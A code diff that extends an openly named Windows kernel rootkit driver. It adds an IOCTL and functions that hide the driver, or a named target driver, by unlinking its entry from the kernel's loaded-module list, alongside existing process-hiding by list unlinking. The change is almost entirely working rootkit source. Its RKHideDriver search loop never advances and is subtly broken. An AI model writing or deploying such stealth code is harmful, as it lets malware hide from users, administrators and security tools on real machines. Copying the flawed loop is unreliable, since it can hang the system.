@@ -1,5 +1,6 @@
 #include <ntddk.h>
 #include "Header.h"
+#include "DriverHeader.h"
 
 EXTERN_C_START
 NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING);
@@ -25,7 +26,12 @@ VOID RKUnload(
 
 // our main functionality.
 NTSTATUS RKHideProcess(
-	 UINT32 PID
+	 _In_ UINT32 PID
+);
+
+NTSTATUS RKHideDriver(
+	_In_ PDRIVER_OBJECT DriverObject,
+	_In_ PUNICODE_STRING TargetDriverPath
 );
 
 // remove the process from the process table..
@@ -34,14 +40,19 @@ VOID RKModifyProcessLinks(
 	 UINT64 listEntryOffset
 );
 
+VOID RKModifyDriverLinks(
+	_In_ PKLDR_DATA_TABLE_ENTRY pCurrentDataTableEntry
+);
+
 EXTERN_C_END
 
 
-NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING)
+NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
 {
 	NTSTATUS status;
 	UNICODE_STRING SymLinkName, DeviceName;
 	PDEVICE_OBJECT DeviceObject;
+	PKLDR_DATA_TABLE_ENTRY tableEntry = NULL;
 
 	RtlInitUnicodeString(&SymLinkName, L"\\??\\RootKitSym");
 	RtlInitUnicodeString(&DeviceName, L"\\Device\\RootKitDevice");
@@ -51,6 +62,27 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING)
 	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = RKDeviceControl;
 	DriverObject->MajorFunction[IRP_MJ_READ] = DriverObject->MajorFunction[IRP_MJ_WRITE] = RKReadWrite;
 	DriverObject->DriverUnload = RKUnload;
+	
+	tableEntry = (PKLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
+
+	if (tableEntry == NULL)
+	{
+		KdPrint(("[--] error while getting the module entry."));
+	}
+	else
+	{
+		KdPrint(("[+] the address of module entry is : %x", tableEntry));
+		if (tableEntry->FullDllName.Buffer != NULL)
+		{
+			KdPrint(("[+++] the drive FULL DLLL NAME is: %wZ", tableEntry->FullDllName));
+			KdPrint(("[+++] & Driver Base Dll Name is: %wZ", tableEntry->BaseDllName));
+			KdPrint(("[+++] lastly the driver name from driver object is : %wZ", DriverObject->DriverName));
+		}
+		else
+		{
+			KdPrint(("[---] error while getting the driver name from module entry."));
+		}
+	}
 
 
 	status = IoCreateDevice(DriverObject, 0, &DeviceName, FILE_DEVICE_UNKNOWN, NULL, FALSE, &DeviceObject);
@@ -116,7 +148,7 @@ NTSTATUS RKDeviceControl(
 	PDATA_FROM_USER dataBuffer = NULL;
 	DATA_TO_USER dataBufferToUser = { 0 };
 	NTSTATUS status;
-
+	PKLDR_DATA_TABLE_ENTRY pDataTableEntry = NULL;
 	// now here's the real work..
 	// we should receive a PID..
 
@@ -125,7 +157,7 @@ NTSTATUS RKDeviceControl(
 	switch (irpStackLocation->Parameters.DeviceIoControl.IoControlCode)
 	{
 	
-	case RK_CTL:
+	case RK_CTL_PROCESS_HIDE:
 		// LET'S CHECK THE BUFFER SIZE..
 		if (irpStackLocation->Parameters.DeviceIoControl.InputBufferLength < DATA_FROM_USER_SIZE)
 		{
@@ -174,6 +206,16 @@ SENDTOUSER:
 			Irp->IoStatus.Information = DATA_TO_USER_SIZE;
 		}
 		
+		break;
+
+	case RK_CTL_DRIVER_HIDE:
+		// here I don't care much about the input data, my target is only to hide this driver not other drivers,
+		// :: maybe in the future I will add this utility to hide other drivers.
+		pDataTableEntry = static_cast<PKLDR_DATA_TABLE_ENTRY>(DeviceObject->DriverObject->DriverSection);
+
+		RKModifyDriverLinks(pDataTableEntry);
+		KdPrint(("[+] Now your driver is hidden.\n"));
+
 		break;
 
 	default:
@@ -310,4 +352,58 @@ VOID RKModifyProcessLinks(
 	pCurrentProcessListEntry->Flink = (PLIST_ENTRY) & (pCurrentProcessListEntry->Flink);
 	pCurrentProcessListEntry->Blink = (PLIST_ENTRY) & (pCurrentProcessListEntry->Flink);
 
+}
+
+NTSTATUS RKHideDriver(
+	_In_ PDRIVER_OBJECT DriverObject,
+	_In_ PUNICODE_STRING TargetDriverPath
+
+)
+{
+	PKLDR_DATA_TABLE_ENTRY pDataTabeEntry = NULL, pCurrentTableEntry = NULL;
+	// first let's check whether we have a valid pointer.
+	if (DriverObject == NULL || TargetDriverPath == NULL)
+		return STATUS_INVALID_ADDRESS;
+
+	// NOWWW LET'S GET INTO WORK:
+	pDataTabeEntry = static_cast<PKLDR_DATA_TABLE_ENTRY>(DriverObject->DriverSection);
+
+	pCurrentTableEntry = pDataTabeEntry;
+
+	while (pCurrentTableEntry->InLoadOrderLinks.Flink != &pDataTabeEntry->InLoadOrderLinks)
+	{
+		if (pCurrentTableEntry->FullDllName.Length != 0)
+		{
+			if (RtlCompareUnicodeString(TargetDriverPath, &pCurrentTableEntry->FullDllName, FALSE) == 0)
+			{
+				// now we found it, let's modify the structure..
+				RKModifyDriverLinks(pCurrentTableEntry);
+				KdPrint(("[+] YOUR TARGET ROOTKIT IS HIDDEN NOW.\n"));
+				break;
+
+			}
+		}
+	}
+
+	return STATUS_SUCCESS;
+
+}
+
+VOID RKModifyDriverLinks(
+	_In_ PKLDR_DATA_TABLE_ENTRY pCurrentDataTableEntry
+)
+{
+	PLIST_ENTRY pTempListEntry = NULL;
+
+	// the previous one
+	pTempListEntry = pCurrentDataTableEntry->InLoadOrderLinks.Blink;
+	pTempListEntry->Flink = pCurrentDataTableEntry->InLoadOrderLinks.Flink;
+
+	// the forward one
+	pTempListEntry = pCurrentDataTableEntry->InLoadOrderLinks.Flink;
+	pTempListEntry->Blink = pCurrentDataTableEntry->InLoadOrderLinks.Blink;
+
+	//  modify our LIST_ENTRY structure againn.
+	pCurrentDataTableEntry->InLoadOrderLinks.Flink = (PLIST_ENTRY) & (pCurrentDataTableEntry->InLoadOrderLinks.Flink);
+	pCurrentDataTableEntry->InLoadOrderLinks.Blink = (PLIST_ENTRY) & (pCurrentDataTableEntry->InLoadOrderLinks.Flink);
 }
